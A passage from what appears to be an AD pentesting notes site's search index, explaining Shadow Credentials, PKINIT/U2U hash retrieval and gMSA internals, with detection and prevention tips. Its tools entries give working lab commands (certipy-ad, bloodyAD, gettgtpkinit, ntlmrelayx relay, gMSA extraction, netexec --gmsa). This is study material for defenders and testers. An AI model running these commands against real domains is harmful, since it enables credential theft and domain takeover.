Movement","lvl":4,"t":"🧪 1️⃣ Detect PKINIT-Based TGT Requests","c":"Monitor event: 4768 → Kerberos authentication ticket (TGT) requested 🔎 Indicator ⚠️ Suspicious if: Certificate Information fields are NOT blank ✔️ Especially when: PKINIT is not commonly used Target account normally doesn’t use certificate-based auth"},{"id":"detect-attribute-modification","u":"01_attacks-lateral-movement.html#detect-attribute-modification","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧪 2️⃣ Detect Attribute Modification","c":"Monitor event: 5136 → Directory service object was modified 🔎 Indicator ⚠️ Suspicious if: msDS-KeyCredentialLink is modified ❗ And modifier is NOT: Azure AD Connect account ADFS service account 📌 Requirement ✔️ SACL must be configured to audit: AD object modification"},{"id":"prevention","u":"01_attacks-lateral-movement.html#prevention","sec":"Attacks + Lateral Movement","lvl":4,"t":"🛡️ Prevention","c":""},{"id":"restrict-object-control","u":"01_attacks-lateral-movement.html#restrict-object-control","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 1️⃣ Restrict Object Control","c":"✔️ Audit permissions on: Privileged accounts ⚠️ Rule Low-privileged users should NOT modify: msDS-KeyCredentialLink of privileged accounts"},{"id":"deny-modification-via-ace","u":"01_attacks-lateral-movement.html#deny-modification-via-ace","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 2️⃣ Deny Modification via ACE","c":"Add Access Control Entry (ACE) : DENY → EVERYONE → msDS-KeyCredentialLink ✔️ Apply to: Accounts not using Key Trust Especially privileged accounts"},{"id":"limitation","u":"01_attacks-lateral-movement.html#limitation","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Limitation","c":"❗ Can be bypassed if attacker has: WriteOwner WriteDACL"},{"id":"detection-for-bypass","u":"01_attacks-lateral-movement.html#detection-for-bypass","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔎 Detection for Bypass","c":"✔️ Use SACL to detect: Permission changes / ACL modifications"},{"id":"summary-2","u":"01_attacks-lateral-movement.html#summary-2","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Summary","c":"4768 → Detect PKINIT usage 5136 → Detect attribute modification Restrict permissions + DENY ACE → Prevention SACL → Detect bypass attempts"},{"id":"understanding-pkinit-ntml-hash","u":"01_attacks-lateral-movement.html#understanding-pkinit-ntml-hash","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding PKINIT + NTML Hash","c":""},{"id":"what-is-pkinit","u":"01_attacks-lateral-movement.html#what-is-pkinit","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 What is PKINIT?","c":"📌 Overview In Kerberos, clients must perform pre-authentication before receiving a TGT (Ticket Granting Ticket) Purpose: ✔️ Prevents offline password cracking ✔️ Mitigates attacks like AS-REP Roasting"},{"id":"pre-authentication-in-kerberos","u":"01_attacks-lateral-movement.html#pre-authentication-in-kerberos","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Pre-Authentication in Kerberos","c":"🔄 How it Works Client proves identity by: ⏱️ Encrypting a timestamp 🔒 Using its credentials ✔️ Timestamp prevents replay attacks"},{"id":"symmetric-key-approach-traditional","u":"01_attacks-lateral-movement.html#symmetric-key-approach-traditional","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Symmetric Key Approach (Traditional)","c":"📌 Key Points Uses symmetric key derived from password Example: RC4 → key = NT hash"},{"id":"flow","u":"01_attacks-lateral-movement.html#flow","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Flow","c":"1️⃣ Client: Encrypts timestamp using secret key 2️⃣ KDC: Has copy of secret key ✔️ Decrypts timestamp ✔️ Authenticates client 3️⃣ KDC: 🔑 Generates session key 🔐 Encrypts it with same secret key 🎟️ Sends TGT to client"},{"id":"pkinit-asymmetric-authentication","u":"01_attacks-lateral-movement.html#pkinit-asymmetric-authentication","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 PKINIT (Asymmetric Authentication)","c":"📌 Overview Uses public-private key pairs instead of passwords Less common than symmetric Kerberos"},{"id":"pkinit-flow","u":"01_attacks-lateral-movement.html#pkinit-flow","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 PKINIT Flow","c":"1️⃣ Client: ✍️ Signs/encrypts pre-auth data using private key 📤 Sends public key + request to KDC 2️⃣ KDC: 🔓 Uses client’s public key ✔️ Decrypts and verifies request"},{"id":"session-key-exchange-methods","u":"01_attacks-lateral-movement.html#session-key-exchange-methods","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Session Key Exchange Methods","c":"1️⃣ Diffie-Hellman Key Delivery ✔️ Secure shared session key generation ✔️ Protects against passive MITM attacks ✔️ Provides (almost) Perfect Forward Secrecy ⚠️ Note: Session key also stored in TGT Encrypted using KRBTGT secret key 2️⃣ Public Key Encryption Key Delivery ✔️ KDC generates session key 🔐 Encrypts using: KDC’s private key Client’s public key"},{"id":"certificate-trust-model-pki","u":"01_attacks-lateral-movement.html#certificate-trust-model-pki","sec":"Attacks + Lateral Movement","lvl":4,"t":"🏛️ Certificate Trust Model (PKI)","c":"📌 Overview Uses Digital Certificates signed by CA Both client and KDC trust the CA ✔️ Usage Smart card authentication Standard PKINIT deployments"},{"id":"requirement","u":"01_attacks-lateral-movement.html#requirement","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Requirement","c":"Both client and KDC must have: 🔑 Public-private key pairs If AD CS is present: ✔️ Domain Controller automatically gets certificate"},{"id":"key-trust-model-no-pki","u":"01_attacks-lateral-movement.html#key-trust-model-no-pki","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Key Trust Model (No PKI)","c":"📌 Overview No certificate required for client Uses raw public keys"},{"id":"storage","u":"01_attacks-lateral-movement.html#storage","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔗 Storage","c":"msDS-KeyCredentialLink"},{"id":"key-credential-contains","u":"01_attacks-lateral-movement.html#key-credential-contains","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧩 Key Credential Contains","c":"📅 Creation date 🧾 Distinguished Name 🆔 Device GUID 🔑 Public key"},{"id":"characteristics","u":"01_attacks-lateral-movement.html#characteristics","sec":"Attacks + Lateral Movement","lvl":4,"t":"✔️ Characteristics","c":"Multi-value attribute Supports multiple devices per account"},{"id":"authentication-flow","u":"01_attacks-lateral-movement.html#authentication-flow","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Authentication Flow","c":"1️⃣ Client: Sends request with public key 2️⃣ KDC: 🔍 Checks: msDS-KeyCredentialLink 3️⃣ If match: ✔️ Authentication successful 🎟️ TGT issued"},{"id":"critical-insight","u":"01_attacks-lateral-movement.html#critical-insight","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Critical Insight","c":"If attacker can write to msDS-KeyCredentialLink → They can authenticate as that user → Obtain TGT"},{"id":"summary-3","u":"01_attacks-lateral-movement.html#summary-3","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Summary","c":"Symmetric Kerberos → Password-based PKINIT → Public/Private key-based Certificate Trust → Uses CA Key Trust → Uses msDS-KeyCredentialLink"},{"id":"what-about-ntlm","u":"01_attacks-lateral-movement.html#what-about-ntlm","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 What About NTLM?","c":"📌 Overview PKINIT allows: ✔️ Kerberos authentication ✔️ Obtaining a TGT ❓ Problem: Some resources still require NTLM authentication"},{"id":"solution-ntlm-via-kerberos-ticket","u":"01_attacks-lateral-movement.html#solution-ntlm-via-kerberos-ticket","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Solution: NTLM via Kerberos Ticket","c":"Client can request a special Service Ticket This ticket contains: 🔐 NTLM hash inside PAC"},{"id":"pac-privilege-attribute-certificate","u":"01_attacks-lateral-movement.html#pac-privilege-attribute-certificate","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧾 PAC (Privilege Attribute Certificate)","c":"Stored inside: 🔒 Encrypted part of the ticket Encryption depends on ticket type: 🎟️ TGT → Encrypted with KRBTGT key 🎫 Service Ticket → Encrypted with service key"},{"id":"limitation-1","u":"01_attacks-lateral-movement.html#limitation-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Limitation","c":"User cannot decrypt TGT → Cannot access NTLM hash directly"},{"id":"kerberos-u2u-user-to-user-authentication","u":"01_attacks-lateral-movement.html#kerberos-u2u-user-to-user-authentication","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Kerberos U2U (User-to-User) Authentication","c":"📌 Purpose Allows user to obtain a ticket they can decrypt"},{"id":"working-flow-1","u":"01_attacks-lateral-movement.html#working-flow-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Working Flow","c":"1️⃣ User requests Service Ticket to itself 2️⃣ Sends: Its own TGT as: Additional Ticket 3️⃣ KDC: Extracts session key from TGT Generates new Service Ticket"},{"id":"encryption-behavior","u":"01_attacks-lateral-movement.html#encryption-behavior","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Encryption Behavior","c":"U2U Service Ticket is encrypted with: User’s session key (NOT secret key) ✔️ Result User can: 🔓 Decrypt Service Ticket 📥 Access PAC 🔑 Extract NTLM hash"},{"id":"important-design-considerations","u":"01_attacks-lateral-movement.html#important-design-considerations","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Important Design Considerations","c":"Session key changes for every authentication KDC does NOT store session keys Extracts session key from: TGT (encrypted part)"},{"id":"critical-insight-1","u":"01_attacks-lateral-movement.html#critical-insight-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 Critical Insight","c":"If attacker can: → Write to msDS-KeyCredentialLink → Authenticate via PKINIT → Perform U2U request Then: → They can retrieve NTLM hash of target user"},{"id":"condition-important","u":"01_attacks-lateral-movement.html#condition-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"📌 Condition (Important)","c":"As per MS-PAC: NTLM_SUPPLEMENTAL_CREDENTIAL → Added ONLY if PKINIT authentication is used"},{"id":"summary-4","u":"01_attacks-lateral-movement.html#summary-4","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Summary","c":"PKINIT → Get TGT U2U → Get decryptable ticket PAC → Contains NTLM hash → NTLM hash extraction possible"},{"id":"important-condition-ms-pac","u":"01_attacks-lateral-movement.html#important-condition-ms-pac","sec":"Attacks + Lateral Movement","lvl":4,"t":"📌 Important Condition (MS-PAC)","c":"As per MS-PAC specification : NTLM_SUPPLEMENTAL_CREDENTIAL → Added to PAC ONLY if PKINIT authentication is used 🔑 Meaning ✔️ If authentication uses PKINIT : PAC includes NTLM hash data ❌ If authentication uses password (symmetric Kerberos) : PAC does NOT include NTLM hash"},{"id":"key-insight-1","u":"01_attacks-lateral-movement.html#key-insight-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Key Insight","c":"PKINIT authentication → Enables NTLM hash retrieval (via PAC)"},{"id":"tools","u":"01_attacks-lateral-movement.html#tools","sec":"Attacks + Lateral Movement","lvl":3,"t":"Tools","c":""},{"id":"certipy-ad","u":"01_attacks-lateral-movement.html#certipy-ad","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚙️ Certipy-ad","c":"📌 Overview Automates full Shadow Credentials attack Performs: Add Key Credential → Authenticate → Get NT hash + TGT → Restore original state 🧪 Command certipy-ad shadow auto-u krishna@ignite.local-p Password@1-account dc$"},{"id":"what-happens","u":"01_attacks-lateral-movement.html#what-happens","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 What Happens","c":"1️⃣ Adds new Key Credential to target ( dc$ ) 2️⃣ Authenticates using injected key 3️⃣ Retrieves: 🔑 NTLM hash 🎟️ TGT 4️⃣ Restores original msDS-KeyCredentialLink"},{"id":"bloodyad","u":"01_attacks-lateral-movement.html#bloodyad","sec":"Attacks + Lateral Movement","lvl":4,"t":"🩸 BloodyAD","c":"📌 Overview Used to manually add Shadow Credentials Targets: msDS-KeyCredentialLink 🧪 Command bloodyAD --host 192.168.1.58 -u krishna -p Password@1 -d ignite.local add shadowCredentials DC$ 🔄 Output Generates: Certificate (.pem) + Private Key (.pem)"},{"id":"pkinittools-get-tgt","u":"01_attacks-lateral-movement.html#pkinittools-get-tgt","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 PKINITtools (Get TGT)","c":"📌 Purpose Use certificate + private key to obtain TGT via PKINIT 🧪 Command python3 PKINITtools/gettgtpkinit.py \\ -cert-pem CVU5WmSJ_cert.pem \\ -key-pem CVU5WmSJ_priv.pem \\ ignite.local/DC$ raj.ccache 🔄 Result TGT saved in .ccache file"},{"id":"ntlmrelayx-shadow-credentials-via-relay","u":"01_attacks-lateral-movement.html#ntlmrelayx-shadow-credentials-via-relay","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔁 NTLMRelayx (Shadow Credentials via Relay)","c":"📌 Overview Uses NTLM relay to inject Shadow Credentials Targets LDAP service 🧪 Command impacket-ntlmrelayx \\ -t ldap://192.168.1.58 \\ --shadow-credentials \\ --shadow-target'dc$'"},{"id":"attack-flow","u":"01_attacks-lateral-movement.html#attack-flow","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Attack Flow","c":"1️⃣ Start Relay Listener Waits for incoming NTLM authentication 2️⃣ Trigger Authentication Use browser with: krishna credentials 3️⃣ Receive Connection DC$ → connects → sends NTLM auth 4️⃣ Relay to LDAP NTLM auth relayed to: LDAP on Domain Controller 5️⃣ Modify Attribute msDS-KeyCredentialLink updated ✔️ Shadow Credential injected"},{"id":"get-tgt-using-pfx","u":"01_attacks-lateral-movement.html#get-tgt-using-pfx","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Get TGT Using PFX","c":"🧪 Command python3 PKINITtools/gettgtpkinit.py \\ -cert-pfx vX3iEoe3.pfx \\ -pfx-pass 5SwBdP4py1IG9kDhh2nk \\ ignite.local/dc$ shadow.ccache 🔄 Result TGT obtained for DC$"},{"id":"gmsa","u":"01_attacks-lateral-movement.html#gmsa","sec":"Attacks + Lateral Movement","lvl":2,"t":"GMSA","c":""},{"id":"understanding-the-core-concept-3","u":"01_attacks-lateral-movement.html#understanding-the-core-concept-3","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"what-exactly-is-a-gmsa-group-managed-service-account","u":"01_attacks-lateral-movement.html#what-exactly-is-a-gmsa-group-managed-service-account","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟥 1. What EXACTLY is a gMSA (Group Managed Service Account)?","c":"A gMSA is a special AD security principal created for services running on multiple servers without admins ever knowing the password . It is: A special user service account (User Object in AD) That has no interactive logon And whose password is 128-character complex string auto-rotated by AD. The gMSA object is stored in AD under: CN=svcSQL$,CN=Managed Service Accounts,DC=lab,DC=com Key attributes: msDS-ManagedPassword → Stores current + previous password blobs msDS-ManagedPasswordInterval → Days between password rotations PrincipalsAllowedToRetrieveManagedPassword → Machines/Groups allowed to read the password"},{"id":"what-exactly-is-gmsa","u":"01_attacks-lateral-movement.html#what-exactly-is-gmsa","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔐 What Exactly is gMSA?","c":"Most explanations jump directly to passwords and management, but let’s first understand what a gMSA actually is."},{"id":"definition","u":"01_attacks-lateral-movement.html#definition","sec":"Attacks + Lateral Movement","lvl":4,"t":"📌 Definition","c":"A gMSA (Group Managed Service Account) is: ➡️ A special type of Active Directory account that is designed to be used by: Windows Services IIS Application Pools Scheduled Tasks SQL Services Enterprise Applications instead of using a normal user account."},{"id":"what-is-it-internally","u":"01_attacks-lateral-movement.html#what-is-it-internally","sec":"Attacks + Lateral Movement","lvl":4,"t":"🤔 What is it internally?","c":"Think of Active Directory objects: User Object Computer Object Group Object gMSA Object A gMSA is its own AD object class . It is not: ❌ A user account ❌ A computer account ❌ A group It is a service account object managed by AD."},{"id":"gmsa-lifecycle","u":"01_attacks-lateral-movement.html#gmsa-lifecycle","sec":"Attacks + Lateral Movement","lvl":3,"t":"🚀 gMSA Lifecycle","c":"Step 1 - Administrator Creates gMSA Example: SQLService$ and specifies: Allowed Computers SQL01$ SQL02$ SQL03$ This information is stored in the gMSA object in AD. Step 2 - SQL01 Starts When: SQL01 boots or SQL Service starts Windows notices: “This service is configured to run as SQLService$” Step 3 - SQL01 Contacts Domain Controller SQL01 (using its computer account SQL01$) asks: “Can I use SQLService$?” Step 4 - DC Checks Authorization DC checks the gMSA object. Specifically: msDS-GroupMSAMembership (contains computers/groups allowed to retrieve the gMSA password) DC sees: ✅ SQL01$ is authorized Step 5 - DC Provides Managed Password Data DC sends the managed password information to SQL01. At this point: ❌ No human sees it ❌ No admin types it ❌ No application developer knows it Windows handles everything. Step 6 - LSASS Stores It The credential material becomes available to Windows security components. Think: SQL Service ↓ LSASS ↓ gMSA credential available Now SQL Server can authenticate as: SQLService$ Step 7 - Future Authentication Later when SQL needs to access: SMB share SQL cluster node Web service Another server it does not go back to AD every single time asking for the password. Instead: SQL Service → LSASS → Uses already available gMSA credential → Requests Kerberos tickets as needed"},{"id":"when-was-gmsa-introduced","u":"01_attacks-lateral-movement.html#when-was-gmsa-introduced","sec":"Attacks + Lateral Movement","lvl":3,"t":"📜 When was gMSA introduced?","c":"Microsoft introduced:"},{"id":"msa-managed-service-account","u":"01_attacks-lateral-movement.html#msa-managed-service-account","sec":"Attacks + Lateral Movement","lvl":4,"t":"➜ MSA (Managed Service Account)","c":"Introduced in Windows Server 2008 R2 Limitation: Could only be used by one server Not suitable for load-balanced applications"},{"id":"gmsa-group-managed-service-account","u":"01_attacks-lateral-movement.html#gmsa-group-managed-service-account","sec":"Attacks + Lateral Movement","lvl":4,"t":"➜ gMSA (Group Managed Service Account)","c":"Introduced in Windows Server 2012 Solved the multi-server limitation One gMSA can be used by multiple authorized servers"},{"id":"why-was-gmsa-created","u":"01_attacks-lateral-movement.html#why-was-gmsa-created","sec":"Attacks + Lateral Movement","lvl":4,"t":"🤔 Why was gMSA created?","c":"Before gMSA, companies typically used: Service Accounts Examples: svc_sql svc_backup svc_iis svc_exchange These were just normal Active Directory user accounts used by services. Passwords auto-rotate automatically (every 30 days by default) No one knows the actual password Only authorized computers can retrieve it Perfect for service-to-service authentication"},{"id":"problems-with-traditional-service-accounts","u":"01_attacks-lateral-movement.html#problems-with-traditional-service-accounts","sec":"Attacks + Lateral Movement","lvl":4,"t":"Problems with traditional service accounts","c":"❌ Passwords rarely changed Admins often configured: ✔ Password never expires because changing the password could break services. Result: Same password used for years Easy target for attackers ❌ Password rotation was difficult Changing a service account password meant: Change password in AD Update service configuration Restart service Verify application still works Miss one step: 💥 Service outage ❌ Too many people knew the password Typical environment: Server admins know it DBA team knows it Application team knows it Result: Shared secret Poor accountability"},{"id":"attribute-required-to-read-a-gmsa-password","u":"01_attacks-lateral-movement.html#attribute-required-to-read-a-gmsa-password","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟦 Attribute Required to Read a gMSA Password","c":"To read (retrieve) a gMSA password from Active Directory, the object must have:"},{"id":"attribute-principalsallowedtoretrievemanagedpassword","u":"01_attacks-lateral-movement.html#attribute-principalsallowedtoretrievemanagedpassword","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟥 1. Attribute: PrincipalsAllowedToRetrieveManagedPassword","c":"This is the ONLY attribute that controls who can retrieve the gMSA password. ✔ This attribute contains: Computer accounts (SERVER01$) Groups (CN=WebServers,OU=Groups) Service Accounts Other security principals Only the principals listed in this attribute can contact a DC and retrieve: msDS-ManagedPassword"},{"id":"how-it-works","u":"01_attacks-lateral-movement.html#how-it-works","sec":"Attacks + Lateral Movement","lvl":4,"t":"🟦 How it Works","c":"When a computer wants the gMSA password, it sends a Kerberos AS-REQ to the Domain Controller. The DC checks: Is the requester in: PrincipalsAllowedToRetrieveManagedPassword ? If YES → DC returns the encrypted password blob . If NO → Access denied . Only principals listed in: PrincipalsAllowedToRetrieveManagedPassword (or internally msDS-GroupMSAMembership ) Example: sqlsvc$ Allowed machines: SQL01$ WEB01$ Meaning: SQL01$ → can request password WEB01$ → can request password"},{"id":"attribute-that-stores-the-password-msds-managedpassword","u":"01_attacks-lateral-movement.html#attribute-that-stores-the-password-msds-managedpassword","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟥 2. Attribute That Stores the Password: msDS-ManagedPassword","c":"This attribute contains the actual password blob , but it is encrypted and cannot be decrypted without: KDS root key material gMSA SID Machine-specific cryptographic info Only computers in PrincipalsAllowedToRetrieveManagedPassword can successfully decrypt it. The password is stored as an attribute of the gMSA object in Active Directory . Inside the blob: Current password Previous password NTLM hash AES keys Rotation metadata"},{"id":"summary-table-3","u":"01_attacks-lateral-movement.html#summary-table-3","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟦 Summary Table","c":"Purpose | Attribute | — | — | Who is allowed to read the gMSA password | PrincipalsAllowedToRetrieveManagedPassword | Actual encrypted password blob | msDS-ManagedPassword | Password rotation interval | msDS-ManagedPasswordInterval |"},{"id":"how-gmsa-password-rotation-actually-works-internal-mechanism","u":"01_attacks-lateral-movement.html#how-gmsa-password-rotation-actually-works-internal-mechanism","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟥 2. How gMSA Password Rotation Actually Works (Internal Mechanism)","c":"Most people think domain controllers generate the password — WRONG. ✔ TRUE: Key Distribution Service (KDS) generates keys used to encrypt the password blob. ✔ TRUE: Domain controllers generate the actual gMSA password and store it in AD. Internal Working:"},{"id":"kds-root-key","u":"01_attacks-lateral-movement.html#kds-root-key","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟦 2.1 KDS Root Key","c":"A KDS Root Key is created on DCs: Add-KdsRootKey –EffectiveImmediately This key is used to produce per-account encryption keys ."},{"id":"gmsa-password-blob","u":"01_attacks-lateral-movement.html#gmsa-password-blob","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟦 2.2 gMSA Password Blob","c":"msDS-ManagedPassword is NOT stored in clear text. It is a complex blob containing: Current password Previous password Password expiry time Password length Metadata The blob is encrypted using: KDS Root Key + gMSA SID + Domain SID This ensures: Only allowed computers can decrypt Even Domain Admins cannot directly read the plaintext (they would need to run code as SYSTEM on an allowed machine)"},{"id":"how-a-machine-retrieves-the-password","u":"01_attacks-lateral-movement.html#how-a-machine-retrieves-the-password","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟦 2.3 How a MACHINE retrieves the password","c":"A computer (e.g., SQL01$) sends a Kerberos AS-REQ to the KDC asking: Give me the managed password for svcSQL$ AD checks: Does SQL01$ exist in: PrincipalsAllowedToRetrieveManagedPassword If YES → DC sends the encrypted blob. Then the computer decrypts it using the KDS key it knows internally."},{"id":"what-happens-if-an-attacker-compromises-a-machine-allowed-to-retrieve-gmsa-password","u":"01_attacks-lateral-movement.html#what-happens-if-an-attacker-compromises-a-machine-allowed-to-retrieve-gmsa-password","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟥 3. What happens if an attacker compromises a machine allowed to retrieve gMSA password?","c":"You can extract the gMSA password ANY TIME. That means: You can obtain the raw NTLM hash You can pass-the-hash You can run commands as that gMSA account on ANY server PowerShell extraction example: $gmsa = Get-ADServiceAccount svcSQL$ -Properties msDS-ManagedPassword $pwd = ConvertFrom-ADManagedPasswordBlob $gmsa.msDS-ManagedPassword $pwd.SecureCurrentPassword To extract the NTLM hash , convert to Unicode → NTLM. Tools: Mimikatz ( sekurlsa::ekeys ) DSInternals SharpGMSA (offensive tool)"},{"id":"when-a-service-starts","u":"01_attacks-lateral-movement.html#when-a-service-starts","sec":"Attacks + Lateral Movement","lvl":3,"t":"When a Service Starts","c":"Example: SQL Server on SQL01 . Process: SQL01 authenticates to Domain Controller SQL01 requests attribute: msDS-ManagedPassword DC checks permission If allowed → DC returns password blob SQL01 decrypts it SQL service logs in as: CORP\\sqlsvc$"},{"id":"deep-dive-gmsa-permissions-in-ad","u":"01_attacks-lateral-movement.html#deep-dive-gmsa-permissions-in-ad","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟥 4. Deep Dive: gMSA Permissions in AD","c":"gMSAs have NO privileged rights by default. But in real environments admins assign: Local admin on servers SQL sysadmin “Act as part of the OS” rights Constrained/unconstrained delegation Read access to sensitive OUs LAPS access (misconfiguration)"},{"id":"so-compromise-impact-depends-entirely-on-assigned-rights.","u":"01_attacks-lateral-movement.html#so-compromise-impact-depends-entirely-on-assigned-rights.","sec":"Attacks + Lateral Movement","lvl":4,"t":"So compromise impact depends entirely on assigned rights.","c":""},{"id":"important-gmsa-attributes-explained","u":"01_attacks-lateral-movement.html#important-gmsa-attributes-explained","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟥 5 . Important gMSA Attributes Explained","c":"Attribute | Meaning | Attack Relevance | — | — | — | msDS-ManagedPassword | Encrypted password blob | Extract password using Kerberos | PrincipalsAllowedToRetrieveManagedPassword | Who can read password | Machine compromise → gMSA takeover | msDS-ManagedPasswordInterval | Password rotation period | Harder to persist without re-extraction | msDS-AllowedToDelegateTo | Constrained delegation targets | Impersonation attacks | msDS-AllowedToActOnBehalfOfOtherIdentity | RBCD control | Impersonate any user | ServicePrincipalName | SPNs for Kerberos | Kerberoasting WITH gMSA creds possible |"},{"id":"why-gmsa-is-used","u":"01_attacks-lateral-movement.html#why-gmsa-is-used","sec":"Attacks + Lateral Movement","lvl":3,"t":"Why GMSA is used ??","c":""},{"id":"gmsa-is-a-service-account-specialized-type","u":"01_attacks-lateral-movement.html#gmsa-is-a-service-account-specialized-type","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟥 1. gMSA IS a Service Account (Specialized Type)","c":"A Group Managed Service Account (gMSA) is a NON-interactive, NON-human AD user account built only for services , apps , and scheduled tasks , NOT for login by humans. It is created under: CN=Managed Service Accounts It behaves like: A user account (with a password & SID) But runs code/services instead of logging in interactively"},{"id":"why-gmsa-is-used-specifically-for-service-accounts","u":"01_attacks-lateral-movement.html#why-gmsa-is-used-specifically-for-service-accounts","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟦 2. Why gMSA is used specifically FOR service accounts","c":"Because gMSA solves the biggest problems with traditional service accounts:"},{"id":"traditional-service-account-bad","u":"01_attacks-lateral-movement.html#traditional-service-account-bad","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟢 Traditional Service Account (bad)","c":"Human knows password Password stored in config files Password reused on many servers Password rarely rotated Hard to manage in multi-server farms Often part of “Domain Admins” or local admin"},{"id":"gmsa-good","u":"01_attacks-lateral-movement.html#gmsa-good","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟢 gMSA (good)","c":"Password is never known to humans Automatically rotated by AD Only specific servers can retrieve the password Works across server farms (IIS/SQL/SharePoint/ADFS) Supports Kerberos authentication Cannot be used to log in interactively"},{"id":"so-yes-a-gmsa-is-a-service-account-but-with-improvements","u":"01_attacks-lateral-movement.html#so-yes-a-gmsa-is-a-service-account-but-with-improvements","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟦 3. So YES — a gMSA is a Service Account, but with improvements:","c":"Feature | Normal Service Account | gMSA | — | — | — | Password | Human created | Machine generated (~240 chars) | Password rotation | Manual (rare) | Automatic | Stored in config files | YES | NO | Multi-server support | Hard | Easy | Kerberos support | Requires SPN | Built-in | Interactive login | Possible | NOT allowed | Security risk | Very high | Low if configured properly |"},{"id":"what-does-a-gmsa-run","u":"01_attacks-lateral-movement.html#what-does-a-gmsa-run","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟥 4. what does a gMSA run?","c":"A gMSA is used to run: ✔ Windows services (Example: SQL Server, IIS App Pools, Exchange services, AD FS) Run this service as: LAB\\svcSQL$ ✔ Scheduled tasks (Example: automated scripts, backups, monitoring) ✔ Server applications (Example: Web apps, .NET apps, PowerShell apps) ✔ Cluster or web farm services (Known for SharePoint, Exchange, AD FS, SQL AGs)"},{"id":"why-its-called-group-msa","u":"01_attacks-lateral-movement.html#why-its-called-group-msa","sec":"Attacks + Lateral Movement","lvl":3,"t":"🟥 5. Why it’s called Group MSA?","c":"Because multiple machines (a group ) can use the same service account. This is needed when the same app/service runs on: Web01 Web02 Web03 Example: Principals Allowed To Retrieve Managed Password WEB01$ WEB02$ WEB03$ All three servers can retrieve the same one gMSA password."},{"id":"example-2","u":"01_attacks-lateral-movement.html#example-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"Example","c":""},{"id":"multiple-gmsa-accounts-exist-in-ad","u":"01_attacks-lateral-movement.html#multiple-gmsa-accounts-exist-in-ad","sec":"Attacks + Lateral Movement","lvl":3,"t":"1. Multiple gMSA Accounts Exist in AD","c":"In a real AD environment, admins usually create multiple gMSAs , one per service or service group. Example AD objects: sqlsvc$ websvc$ backupsvc$ monitoring$ Each is a separate gMSA object with its own: msDS-ManagedPassword attribute."},{"id":"each-gmsa-has-its-own-password-blob","u":"01_attacks-lateral-movement.html#each-gmsa-has-its-own-password-blob","sec":"Attacks + Lateral Movement","lvl":3,"t":"2. Each gMSA Has Its Own Password Blob","c":"For every gMSA: sqlsvc$ └─ msDS-ManagedPassword → SQL service password websvc$ └─ msDS-ManagedPassword → IIS service password backupsvc$ └─ msDS-ManagedPassword → backup service password Each blob contains: NTLM hash AES128 key AES256 key password metadata So if you can read 3 gMSAs , you get 3 hashes ."},{"id":"why-netexec-can-dump-multiple-gmsa-hashes","u":"01_attacks-lateral-movement.html#why-netexec-can-dump-multiple-gmsa-hashes","sec":"Attacks + Lateral Movement","lvl":3,"t":"3. Why NetExec Can Dump Multiple gMSA Hashes","c":"When you run something like: netexec ldap <DC-IP> -u user -p pass --gmsa NetExec does: Step 1 — LDAP Search It queries Active Directory for objects with: objectClass = msDS-GroupManagedServiceAccount LDAP filter: (&(objectClass=msDS-GroupManagedServiceAccount)) This returns all gMSAs: sqlsvc$ websvc$ backupsvc$ Step 2 — Attempt to Read Password Attribute For each gMSA object it tries to read: msDS-ManagedPassword If your account has permission → success. Step 3 — Convert Password Blob NetExec parses the blob and 